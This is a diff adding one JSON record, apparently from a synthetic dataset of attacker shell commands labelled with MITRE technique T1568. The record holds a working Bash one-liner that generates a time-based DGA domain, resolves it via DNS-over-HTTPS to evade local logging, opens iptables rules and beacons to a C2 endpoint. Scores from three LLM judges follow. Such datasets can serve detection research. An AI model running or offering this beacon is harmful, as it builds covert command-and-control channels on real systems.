@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'd=$(date -u +%Y%m%d%H | md5sum | cut -c1-8).sync-cache.net; ip=$(curl -s \"https://cloudflare-dns.com/dns-query?name=$d&type=A\" -H \"accept: application/dns-json\" | grep -oE \"\\\"data\\\":\\\"[0-9.]+\\\"\" | head -n1 | cut -d\\\" -f4); if [ -n \"$ip\" ]; then port=$(shuf -i 20000-60000 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --connect-timeout 3 \"https://$d:$port/api/v1/c2?node=$(hostname)\"; fi'",
+  "explanation": "Uses DNS-over-HTTPS to resolve a DGA domain, then configures iptables to allow traffic to the resolved IP on a random port and performs an HTTPS beacon. Demonstrates dynamic resolution without local DNS logs.",
+  "rationale_steps": [
+    "Generate DGA domain using hourly seed",
+    "Resolve via DoH (Cloudflare) to avoid local DNS monitoring",
+    "Open iptables rules for the resolved IP and random port",
+    "Beacon to the resolved domain with curl over HTTPS"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-3a73022a",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid pipes/semicolons, correct escaping of inner double-quotes, and valid flags for curl/grep/cut/iptables.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates a DGA domain and resolves via DoH, then randomizes a port and attempts an HTTPS beacon consistent with T1568, but iptables changes require root and the random port likely lacks a listener.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:53:19.291355Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper semicolons and conditional logic, valid flag usage for all tools (curl, iptables, shuf, grep), and correct bash -c quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 by generating a time-based DGA domain, resolving it via DNS-over-HTTPS to evade local DNS logging, dynamically selecting a random port, configuring iptables firewall rules to permit the C2 traffic, and beaconing with host identification — all operationally plausible and tightly aligned with dynamic resolution C2 techniques.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:25:41.714040Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command follows correct Bash syntax, uses valid flags for all utilities (date, md5sum, cut, curl, grep, shuf, iptables), and handles quoting correctly.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements a DGA and DoH resolution; however, it requires root privileges to execute the iptables commands despite the metadata stating 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:25:45.921136Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
